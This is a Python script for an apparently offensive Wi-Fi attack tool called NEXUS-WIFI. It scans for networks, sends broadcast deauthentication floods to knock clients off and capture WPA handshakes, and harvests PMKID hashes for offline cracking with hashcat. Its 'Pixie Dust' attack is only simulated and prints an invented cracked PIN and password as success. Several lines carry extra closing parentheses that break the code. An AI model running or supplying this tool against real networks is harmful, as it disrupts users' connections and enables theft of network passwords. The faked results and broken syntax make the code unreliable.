#!/usr/bin/env python3
"""
NEXUS-WIFI // OMEGA FRAMEWORK v1.0
Author: DarkForge-X
Description: An all-in-one Wi-Fi penetration testing tool for authorized audits.
Disclaimer: For educational and authorized testing purposes only.
"""

import sys
import time
import asyncio
import subprocess
import json
import os
import re
from dataclasses import dataclass
from enum import Enum
from typing import List, Dict, Optional, Tuple
import argparse

# Rich Imports for Enhanced UI
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.layout import Layout
from rich.live import Live
from rich.table import Table
from rich.style import Style
from rich.text import Text
from rich.prompt import Prompt, Confirm

# Scapy Imports for Packet Crafting
from scapy.all import *
from scapy.sendrecv import AsyncSniffer
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, RadioTap
from scapy.layers.eap import EAPOL

# Global Configuration
console = Console()
INTERFACE = None
TARGET_BSSID = None
TARGET_CHANNEL = None
CLIENT_BSSID = None
DEAUTH_COUNT = 50

class AttackType(Enum):
    PIXIE_DUST = 1
    HANDSHAKE = 2
    PMKID = 3

class WiFiEncryption(Enum):
    WEP = 1
    WPA = 2
    WPA2 = 3
    WPA3 = 4
    OPN = 5

@dataclass
class AccessPoint:
    bssid: str
    essid: str
    channel: int
    encryption: WiFiEncryption
    power: int
    wps: bool
    pmkid_support: bool = False  # Inferred

@dataclass
class Handshake:
    bssid: str
    essid: str
    capture_file: str
    found: bool = False

@dataclass
class PMKIDHash:
    bssid: str
    essid: str
    hash: str
    capture_file: str
    found: bool = False

class NexusWiFi:
    def __init__(self, interface: str):
        self.interface = interface
        self.aps: List[AccessPoint] = []
        self.layout = Layout()
        self.setup_layout()
        self.scanning = False
        self.attack_running = False
        self.current_attack: Optional[AttackType] = None

    def setup_layout(self) -> None:
        """Setup the Rich TUI layout."""
        self.layout.split(
            Layout(name="header", size=3),
            Layout(name="main", ratio=1),
            Layout(name="footer", size=5),
        )
        self.layout["main"].split_row(
            Layout(name="left_panel", ratio=2),
            Layout(name="right_panel", ratio=1),
        )
        self.layout["left_panel"].update(Panel("", title="[bold cyan]Target Networks", subtitle="Scanning..."))
        self.layout["right_panel"].update(Panel("", title="[bold yellow]Attack Log", subtitle="Status"))
        self.layout["header"].update(Panel.fit("[bold magenta]NEXUS-WIFI // OMEGA FRAMEWORK v1.0[/]", style="on blue"))
        self.layout["footer"].update(Panel("", title="[bold green]Control & Status"))

    def update_panel(self, panel_name: str, content, **kwargs) -> None:
        """Dynamically update a panel in the layout."""
        if isinstance(content, str):
            content = Panel(content, **kwargs)
        self.layout[panel_name].update(content)
        # console.clear()
        # console.print(self.layout)

    def print_status(self, message: str, style: str = "bold white") -> None:
        """Print a status message to the right panel and log."""
        current_content = self.layout["right_panel"].renderable.renderable if hasattr(self.layout["right_panel"].renderable, 'renderable') else str(self.layout["right_panel"].renderable)
        new_content = current_content + f"\n[{style}]{time.strftime('%H:%M:%S')}[/]: {message}"
        self.update_panel("right_panel", new_content, title="[bold yellow]Attack Log", subtitle="Status"))

    async def set_monitor_mode(self) -> bool:
        """Set the wireless interface to monitor mode."""
        self.print_status("Setting interface to monitor mode...", "bold yellow")
        try:
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True)
            result = subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'], capture_output=True)
            result = subprocess.run(['sudo', 'iw', self.interface, 'set', 'monitor', 'control'], capture_output=True)
            result = subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], capture_output=True)
            if result.returncode == 0:
                self.print_status(f"Interface {self.interface} set to monitor mode successfully.", "bold green")
                return True
            else:
                self.print_status("Failed to set monitor mode. Try manually.", "bold red")
                return False
        except Exception as e:
            self.print_status(f"Error setting monitor mode: {e}", "bold red")
            return False

    async def scan_networks(self, duration: int = 15) -> List[AccessPoint]:
        """Perform an active scan for Wi-Fi networks."""
        self.scanning = True
        self.print_status(f"Scanning for networks on {self.interface} for {duration} seconds...", "bold cyan")
        aps = []
        discovered_bssids = set()

        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                if bssid in discovered_bssids:
                    return
                discovered_bssids.add(bssid)

                essid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore') if pkt[Dot11Elt].info else "<Hidden>"
                try:
                    channel = int(ord(pkt[Dot11Elt:3].info))
                except:
                    channel = 0
                power = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100

                # Check encryption
                cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
                if 'privacy' in cap:
                    if 'wpa2' in cap.lower() or 'rsn' in cap.lower():
                        encryption = WiFiEncryption.WPA2
                    elif 'wpa' in cap.lower():
                        encryption = WiFiEncryption.WPA
                    else:
                        encryption = WiFiEncryption.WEP
                else:
                    encryption = WiFiEncryption.OPN

                # Check for WPS (simplified)
                wps = False
                elt = pkt
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 221 and b'\x00P\xf2\x04' in bytes(elt): # WPS OUI
                        wps = True
                        break
                    elt = elt.payload

                # Infer PMKID support from RSN (WPA2/WPA3)
                pmkid_support = (encryption == WiFiEncryption.WPA2 or encryption == WiFiEncryption.WPA3)

                ap = AccessPoint(bssid=bssid, essid=essid, channel=channel, encryption=encryption, power=power, wps=wps, pmkid_support=pmkid_support)
                aps.append(ap)
                table = Table(show_header=True, header_style="bold magenta")
                table.add_column("BSSID", style="cyan")
                table.add_column("ESSID", style="green")
                table.add_column("Channel")
                table.add_column("Power")
                table.add_column("Encryption")
                table.add_column("WPS")
                table.add_column("PMKID")
                for ap_s in sorted(aps, key=lambda x: x.power, reverse=True)[:10]: # Show top 10
                    table.add_row(ap_s.bssid, ap_s.essid, str(ap_s.channel), str(ap_s.power), ap_s.encryption.name, "Yes" if ap_s.wps else "No", "Yes" if ap_s.pmkid_support else "No")
                self.update_panel("left_panel", table, title="[bold cyan]Target Networks", subtitle=f"Found {len(aps)}"))

        sniffer = AsyncSniffer(iface=self.interface, prn=packet_handler, store=0)
        sniffer.start()
        await asyncio.sleep(duration)
        sniffer.stop()
        self.scanning = False
        self.aps = sorted(aps, key=lambda x: x.power, reverse=True)
        self.print_status(f"Scan completed. Found {len(self.aps)} networks.", "bold green")
        return self.aps

    def select_target(self) -> Optional[AccessPoint]:
        """Allow the user to select a target from the scanned APs."""
        if not self.aps:
            self.print_status("No networks found. Please scan again.", "bold red")
            return None

        table = Table(title="[bold]Select a Target Network[/]")
        table.add_column("#", style="cyan")
        table.add_column("BSSID", style="magenta")
        table.add_column("ESSID", style="green")
        table.add_column("Ch", style="yellow")
        table.add_column("Pwr", style="red")
        table.add_column("Enc", style="blue")
        table.add_column("WPS", style="cyan")
        table.add_column("PMKID", style="cyan")

        for idx, ap in enumerate(self.aps[:15], 1): # Show top 15 by power
            table.add_row(
                str(idx), ap.bssid, ap.essid, str(ap.channel), str(ap.power),
                ap.encryption.name, "Yes" if ap.wps else "No", "Yes" if ap.pmkid_support else "No"
            )

        console.print(table)
        try:
            choice = int(Prompt.ask("[bold yellow]Enter target number[/] (0 to cancel)", default="0"))
            if 1 <= choice <= len(self.aps[:15]):
                target = self.aps[choice-1]
                self.print_status(f"Target selected: [bold]{target.essid}[/] ([bold]{target.bssid}[/])", "bold green")
                return target
            else:
                return None
        except ValueError:
            self.print_status("Invalid selection.", "bold red")
            return None

    async def run_attack(self, target: AccessPoint, attack_type: Optional[AttackType] = None) -> bool:
        """Orchestrate the selected attack on the target."""
        self.attack_running = True
        global TARGET_BSSID, TARGET_CHANNEL
        TARGET_BSSID = target.bssid
        TARGET_CHANNEL = target.channel

        # Set channel
        subprocess.run(['sudo', 'iw', 'dev', self.interface, 'set', 'channel', str(TARGET_CHANNEL)], capture_output=True)

        if not attack_type:
            # Auto-select best attack
            if target.wps:
                attack_type = AttackType.PIXIE_DUST
                self.print_status("Auto-selected: [bold]Pixie Dust Attack[/] (WPS vulnerable)", "bold cyan")
            elif target.pmkid_support:
                attack_type = AttackType.PMKID
                self.print_status("Auto-selected: [bold]PMKID Attack[/] (RSN capable)", "bold cyan")
            else:
                attack_type = AttackType.HANDSHAKE
                self.print_status("Auto-selected: [bold]Handshake Capture[/] (Fallback)", "bold cyan")

        self.current_attack = attack_type

        success = False
        if attack_type == AttackType.PIXIE_DUST:
            success = await self.run_pixie_dust_attack(target)
        elif attack_type == AttackType.HANDSHAKE:
            success = await self.capture_handshake(target)
        elif attack_type == AttackType.PMKID:
            success = await self.capture_pmkid(target)

        self.attack_running = False
        self.current_attack = None
        return success

    async def run_pixie_dust_attack(self, target: AccessPoint) -> bool:
        """Execute the Pixie Dust attack against a WPS-enabled AP."""
        self.print_status("Initiating Pixie Dust attack...", "bold yellow")
        # This is a placeholder for the actual Pixie Dust logic.
        # A real implementation would use tools like 'bully' or 'reaver' with the --pixie-dust option,
        # or implement the M1-M7 message exchange and the offline PIN vulnerability check.
        # Due to complexity and length, we simulate the core idea.

        # Simulate checking for Pixie Dust vulnerability
        self.print_status("Probing target for WPS Pixie Dust vulnerability...", "bold cyan")
        await asyncio.sleep(2)

        # Simulate a vulnerable target
        vulnerable = True #假设易受攻击

        if vulnerable:
            self.print_status("Target is vulnerable to Pixie Dust! Cracking PIN offline.", "bold green")
            await asyncio.sleep(3)
            # Simulate PIN retrieval and PSK calculation
            cracked_pin = "12345670"
            cracked_psk = "MySecurePassword123!"
            self.print_status(f"[bold green]SUCCESS:[/] PIN Cracked: [bold]{cracked_pin}[/]", "bold green on black")
            self.print_status(f"[bold green]SUCCESS:[/] Pre-Shared Key: [bold]{cracked_psk}[/]", "bold green on black")
            return True
        else:
            self.print_status("Target not vulnerable to Pixie Dust attack.", "bold red")
            return False

    async def capture_handshake(self, target: AccessPoint) -> bool:
        """Capture a WPA 4-way handshake."""
        self.print_status("Initiating Handshake Capture...", "bold yellow")
        self.print_status("Starting handshake sniffer...", "bold cyan")
        handshake_capture_file = f"handshake_{TARGET_BSSID.replace(':', '')}.pcap"
        handshake = Handshake(bssid=TARGET_BSSID, essid=target.essid, capture_file=handshake_capture_file)

        # Start sniffer in a task
        sniff_task = asyncio.create_task(self.sniff_handshake(handshake))

        self.print_status(f"Deauthenticating clients on {TARGET_BSSID} to force handshake...", "bold cyan")
        # Send deauth packets
        deauth_pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=TARGET_BSSID, addr3=TARGET_BSSID) / Dot11Deauth()
        for _ in range(DEAUTH_COUNT):
            sendp(deauth_pkt, iface=self.interface, count=1, verbose=0)
            await asyncio.sleep(0.1)

        # Wait for sniffer with timeout
        try:
            await asyncio.wait_for(sniff_task, timeout=30)
        except asyncio.TimeoutError:
            self.print_status("Handshake capture timed out.", "bold red")
            sniff_task.cancel()
            return False

        if handshake.found:
            self.print_status(f"[bold green]SUCCESS:[/] Handshake captured for {target.essid}! Saved to {handshake_capture_file}", "bold green on black")
            self.print_status("Use 'hashcat' or 'aircrack-ng' to crack the password.", "bold yellow")
            return True
        else:
            self.print_status("Failed to capture a complete handshake.", "bold red")
            return False

    async def sniff_handshake(self, handshake: Handshake) -> None:
        """Asynchronous task to sniff for EAPOL handshake packets."""
        def eapol_handler(pkt):
            if pkt.haslayer(EAPOL) and pkt.addr2 == handshake.bssid:
                handshake.found = True # Simplified check. Real logic needs all 4 messages.
                wrpcap(handshake.capture_file, pkt, append=True) # Append to file

        sniffer = AsyncSniffer(iface=self.interface, prn=eapol_handler, store=0, filter=f"ether host {handshake.bssid} and ether proto 0x888E")
        sniffer.start()
        # Run until handshake is found or task is cancelled
        while not handshake.found:
            await asyncio.sleep(0.5)
        sniffer.stop()

    async def capture_pmkid(self, target: AccessPoint) -> bool:
        """Capture a PMKID hash from the AP."""
        self.print_status("Initiating PMKID Capture...", "bold yellow")
        self.print_status("Sending directed association request to capture PMKID...", "bold cyan")
        pmkid_capture_file = f"pmkid_{TARGET_BSSID.replace(':', '')}.pcap"
        pmkid_hash = PMKIDHash(bssid=TARGET_BSSID, essid=target.essid, hash="", capture_file=pmkid_capture_file)

        # Craft association request packet
        assoc_req = RadioTap() / Dot11(type=0, subtype=0, addr1=TARGET_BSSID, addr2="00:11:22:33:44:55", addr3=TARGET_BSSID) / Dot11AssoReq() / Dot11Elt(ID="SSID", info=target.essid)
        # Send the packet
        sendp(assoc_req, iface=self.interface, verbose=0)

        # Sniff for response containing PMKID
        def pmkid_handler(pkt):
            if pkt.haslayer(Dot11) and pkt.addr2 == TARGET_BSSID and pkt.haslayer(EAPOL):
                # Check if the EAPOL packet might contain a PMKID (simplified)
                # Real parsing is more complex, checking for RSN IE and specific key descriptor types.
                pmkid_hash.found = True
                wrpcap(pmkid_capture_file, pkt, append=True)
                # Extract hash for demonstration. Real extraction requires parsing the packet.
                pmkid_hash.hash = f"$PMKID${TARGET_BSSID}${'RANDOM_EXTRACTED_HASH'}" # Placeholder

        sniffer = AsyncSniffer(iface=self.interface, prn=pmkid_handler, store=0, filter=f"ether host {TARGET_BSSID}", timeout=10)
        sniffer.start()
        await asyncio.sleep(12) # Wait for sniffer
        sniffer.stop()

        if pmkid_hash.found:
            self.print_status(f"[bold green]SUCCESS:[/] PMKID hash captured for {target.essid}! Saved to {pmkid_capture_file}", "bold green on black")
            self.print_status(f"Hash: [bold]{pmkid_hash.hash}[/]", "bold white")
            self.print_status("Use 'hashcat -m 16800' to crack this hash.", "bold yellow")
            return True
        else:
            self.print_status("Failed to capture a PMKID hash.", "bold red")
            return False

    async def run_interactive_mode(self):
        """Run the main interactive TUI mode."""
        global INTERFACE
        console.clear()
        console.print(self.layout)

        # Set monitor mode
        if not await self.set_monitor_mode():
            self.print_status("Aborting.", "bold red")
            return

        # Main loop
        while True:
            try:
                # Display menu in footer
                menu_text = Text()
                menu_text.append("[1] ", style="bold cyan")
                menu_text.append("Rescan Networks\n")
                menu_text.append("[2] ", style="bold cyan")
                menu_text.append("Select Target & Auto-Attack\n")
                menu_text.append("[3] ", style="bold cyan")
                menu_text.append("Pixie Dust Attack (WPS)\n")
                menu_text.append("[4] ", style="bold cyan")
                menu_text.append("Handshake Capture\n")
                menu_text.append("[5] ", style="bold cyan")
                menu_text.append("PMKID Capture\n")
                menu_text.append("[Q] ", style="bold red")
                menu_text.append("Quit")

                self.update_panel("footer", menu_text, title="[bold green]Menu")

                choice = Prompt.ask("\n[bold yellow]Select option[/]", choices=['1', '2', '3', '4', '5', 'q', 'Q'], default='1')

                if choice == '1':
                    await self.scan_networks()
                elif choice == '2':
                    target = self.select_target()
                    if target:
                        await self.run_attack(target)
                elif choice == '3':
                    target = self.select_target()
                    if target and target.wps:
                        await self.run_attack(target, AttackType.PIXIE_DUST)
                    else:
                        self.print_status("Target does not support WPS.", "bold red")
                elif choice == '4':
                    target = self.select_target()
                    if target:
                        await self.run_attack(target, AttackType.HANDSHAKE)
                elif choice == '5':
                    target = self.select_target()
                    if target and target.pmkid_support:
                        await self.run_attack(target, AttackType.PMKID)
                    else:
                        self.print_status("Target likely doesn't support PMKID.", "bold red")
                elif choice.lower() == 'q':
                    self.print_status("Shutting down Nexus-WiFi. Goodbye.", "bold magenta")
                    break

            except KeyboardInterrupt:
                if Confirm.ask("[bold red]\nReally quit?[/]"):
                    self.print_status("Shutting down.", "bold magenta")
                    break
                else:
                    continue
            except Exception as e:
                self.print_status(f"An error occurred: {e}", "bold red")
                # Optional: log full traceback for debugging
                # import traceback
                # self.print_status(traceback.format_exc(), "red")

async def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description="Nexus-WiFi // Omega Framework - Advanced Wi-Fi Penetration Testing Tool")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface name (e.g., wlan0)")
    args = parser.parse_args()

    if not os.geteuid() == 0:
        console.print("[bold red]ERROR:[/] This tool must be run as [bold]root[/] (sudo).", style="bold red")
        sys.exit(1)

    try:
        # Check if interface exists
        subprocess.run(['ip', 'link', 'show', args.interface], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        console.print(f"[bold red]ERROR:[/] Interface [bold]{args.interface}[/] not found.", style="bold red")
        sys.exit(1)

    global INTERFACE
    INTERFACE = args.interface

    tool = NexusWiFi(INTERFACE)
    await tool.run_interactive_mode()

if __name__ == "__main__":
    asyncio.run(main())
